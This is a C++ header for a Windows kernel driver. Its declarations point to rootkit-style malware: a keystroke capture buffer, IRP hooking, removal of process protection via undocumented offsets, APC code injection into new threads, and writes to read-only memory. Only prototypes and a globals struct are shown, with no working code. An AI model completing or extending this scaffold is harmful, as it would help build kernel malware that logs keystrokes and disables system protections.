#pragma once

#include "RemoveProtections.h"
#include "IrpHook.h"

/*
	General global definitions and macros
*/

constexpr size_t MAX_KEYSTROKES_TO_SAVE = 8192;

/*
	Globals used in the project
*/
struct Globals {
	// Apc rundown protection
	EX_RUNDOWN_REF ApcRundownProtection;

	// Global data relating to networking UM process
	struct _NetworkingProcess {
		Ppl::ProcessProtectionPolicy PrevProtectionLevel;
		HANDLE Pid;
		bool FoundFirstThread;
	} Network;

	// Cached offsets/addresses of undocumented structues
	// and functions
	struct _CachedOffsets {
		ULONG PsProtectionOffset;
		POBJECT_TYPE IoDriverObjectType;
	} CachedOffsets;

	IrpHookManager* HookManager;

	UCHAR KeystrokeBuffer[MAX_KEYSTROKES_TO_SAVE];
};

extern Globals g_Globals;

/*
	Function declerations
*/

void DriverUnload(PDRIVER_OBJECT);

NTSTATUS IoctlDispatch(PDEVICE_OBJECT, PIRP);

NTSTATUS HandleCopyToMemory(PIRP, PIO_STACK_LOCATION);

NTSTATUS HandleRestoreProtection(PIRP);

NTSTATUS DefaultDispatch(PDEVICE_OBJECT, PIRP);

NTSTATUS CreateClose(PDEVICE_OBJECT, PIRP);

NTSTATUS CompleteIrp(PIRP, NTSTATUS, ULONG_PTR);

void OnCreateProcess(HANDLE, HANDLE, BOOLEAN);

void OnCreateThread(HANDLE, HANDLE, BOOLEAN);

void InjectCode(PVOID, PVOID, PVOID);

NTSTATUS CopyToReadOnlyBuffer(PVOID, const void*, SIZE_T);
